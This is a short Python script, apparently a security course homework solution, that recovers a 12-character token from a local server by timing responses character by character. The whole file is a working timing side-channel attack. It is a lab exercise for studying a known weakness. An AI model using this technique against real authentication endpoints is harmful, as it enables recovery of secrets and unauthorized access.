import requests
import string
import time

# Set token length as constant
TOKEN_LEN = 12

# Set possible characters for token
TOKEN_CHAR = string.digits + string.ascii_lowercase


# Define function to check the timing behavior
def timing_check(token):
    start = time.time()
    response = requests.post("http://0.0.0.0:8080/hw6/ex1", json={"token": token})
    end = time.time()

    time_diff = end - start
    return time_diff


# Define function to average time difference
def timing_avg(time_diff: list):
    return sum(time_diff) / len(time_diff)


# Define function to do automatic token testing
def token_test(token_start):
    # check if token_start reaches length 12
    if len(token_start) == TOKEN_LEN:
        print('Token: {}'.format(token_start))
        return token_start

    times = []
    for char in TOKEN_CHAR:
        print(token_start + char, end="\r")

        char_times = []
        tentative_token = token_start + char + (TOKEN_LEN - len(token_start) - 1) * '_'

        for idx in range(3):
            char_times.append(timing_check(tentative_token))

        # compare sums of means, no difference
        times.append((char, sum(char_times)))

    # char with longest time
    max_char = max(times, key=lambda x: x[1])[0]
    token_test(token_start + max_char)


if __name__ == "__main__":
    token_test('')
